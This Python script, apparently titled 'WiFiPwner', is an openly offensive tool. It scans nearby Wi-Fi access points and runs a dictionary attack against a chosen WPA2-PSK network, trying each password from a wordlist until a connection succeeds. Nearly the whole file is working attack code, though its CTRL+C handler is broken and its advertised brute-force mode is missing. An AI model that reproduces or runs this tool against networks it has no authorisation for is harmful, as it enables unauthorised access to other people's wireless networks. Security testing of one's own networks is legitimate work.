import os
import sys
import argparse
import textwrap
import subprocess
import re
import threading
import time
import pywifi

# Banner
def display_banner():
    banner = """
 _       ___ _______ ____                          
| |     / (_) ____(_) __ \_      ______  ___  _____
| | /| / / / /_  / / /_/ / | /| / / __ \/ _ \/ ___/
| |/ |/ / / __/ / / ____/| |/ |/ / / / /  __/ /    
|__/|__/_/_/   /_/_/     |__/|__/_/ /_/\___/_/     
 
 v0.1 @ Cyber-JA
                                                    """
    print(banner)


# Handle user CTRL+C
def signal_handler(sig, frame):
    print("[-] CTRL+C detected...restoring network interface to managed mode...")
    managed_mode_command = "airmon-ng stop " + interface
    deactiv_monitor = subprocess.check_output(managed_mode_command, shell=True, text=True)
    print("[+] Done")

def print_available_ifaces(interfaces):
    print("[+] Available interfaces:")
    for i in range(0,len(interfaces)):
        print(f'    [{i}] {interfaces[i].name()}')

def select_iface(interface, interfaces):
    for i in range(len(interfaces)):
        if interface == interfaces[i].name():
            return interfaces[i]
    print("[!] Interface not found")

def scan_ap(interface):
    print("[+] Looking for APs...please wait...")
    interface.scan()
    aps = interface.scan_results()
    print("[+] Done")
    bss = set()
    for ap in aps:
        name_signal = (ap.signal, ap.ssid.encode('raw_unicode_escape').decode('utf-8'))
        bss.add(name_signal)
    final = sorted(bss, key=lambda a: a[0], reverse=True)
    return final

def start_attack(interface, essid):
    interface.disconnect()
    while interface.status() == 4:
        pass
    with open("./wordlist.txt", "r") as handle:
        for line in handle.readlines():
            line = line.strip('\n')
            net_profile = pywifi.Profile()
            net_profile.ssid = essid
            net_profile.auth = pywifi.const.AUTH_ALG_OPEN
            net_profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
            net_profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
            net_profile.key = line 
            interface.remove_all_network_profiles()
            tmp = interface.add_network_profile(net_profile)
            interface.connect(tmp)
            
            print(f'[*] Performing attack with password = {line}')
            start = time.time()
            while time.time() - start < 1.5:
                if interface.status() == 4:
                    print(f'[+] Password found: {line}')
                    exit(0)
        print("[-] Password not found")
            

def check_MAC_format(mac_addr):
    mac_regex = r"^([0-9A-Fa-f]{2}([-:]))([0-9A-Fa-f]{2}\2){4}[0-9A-Fa-f]{2}$"
    return bool(re.match(mac_regex, mac_addr))

def main():
    display_banner()
    parser = argparse.ArgumentParser(
        description='WiFi Network Password Attacking Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
    wifipwner.py -e ESSID -a bruter -i wlan1mon
    ''')
    )
    parser.add_argument('-a', '--attack', help='Attack mode (bruter, dictionary)')
    parser.add_argument('-i', '--interface', help='Network interface to be used. Do not set this option to display a list of available interfaces.')
    parser.add_argument('-e', '--essid', help='Specify the wireless network name')
    
    args = parser.parse_args()

    try:    
            wifi = pywifi.PyWiFi()
            if args.interface == None:
                print_available_ifaces(interfaces=wifi.interfaces())
            elif args.essid == None:
                interface = select_iface(args.interface, wifi.interfaces())    
                bss = scan_ap(interface)
                print('_'*40)
                for s,n in bss:
                    print(f'[*] strength: {s} | SSID:{n}')
                print('_'*40)
            #elif args.attack == None:
            else:
                interface = select_iface(args.interface, wifi.interfaces())
                done = 0
                bss = scan_ap(interface)
                for pair in bss:
                    if args.essid == pair[1]:
                        start_attack(interface=interface, essid=args.essid)
                        done = 1
                if done == 0:
                    print("[-] Invalid SSID")
            
    except KeyboardInterrupt:
        signal_handler()


if __name__ == '__main__':
    main()